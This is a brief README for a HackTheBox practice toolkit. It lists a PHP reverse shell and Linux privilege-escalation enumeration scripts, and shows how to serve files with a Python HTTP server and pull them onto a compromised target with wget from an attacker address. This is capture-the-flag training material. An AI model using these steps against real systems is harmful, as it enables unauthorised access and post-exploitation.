# Hackthebox tools
**shell.php** : Use for reverse shell when uploaded to vuln machine

**les.sh and LinEnum.sh** : Use for detect vuln in Linux machine

### How to upload files to vuln linux machine
In your machine type : 
> python -m SimpleHTTPServer

In vuln machine type : 
> wget (your ip address):8000/(file to upload)

Example : 
> wget 10.10.14.62:8000/les.sh
